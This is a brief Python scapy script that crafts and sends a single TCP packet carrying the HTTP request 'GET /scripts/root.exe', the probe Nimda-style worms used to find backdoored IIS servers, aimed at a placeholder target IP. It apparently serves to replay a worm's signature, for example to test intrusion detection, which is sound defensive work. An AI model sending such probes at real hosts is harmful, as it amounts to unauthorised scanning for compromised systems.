from scapy.all import Raw, send
from scapy.layers.inet import IP, TCP

def send_nimda_packet(target_ip, target_port=80, source_ip="192.168.2.36", source_port=12345):
    packet = (
        IP(src=source_ip, dst=target_ip)
        / TCP(sport=source_port, dport=target_port)
        / Raw(load="GET /scripts/root.exe HTTP/1.0\r\nHost: example.com\r\n\r\n")
    )
    send(packet)

if __name__ == "__main__":
    target_ip = "192.168.xxx.xxx"  # Replace with the IP address of the target machine
    send_nimda_packet(target_ip)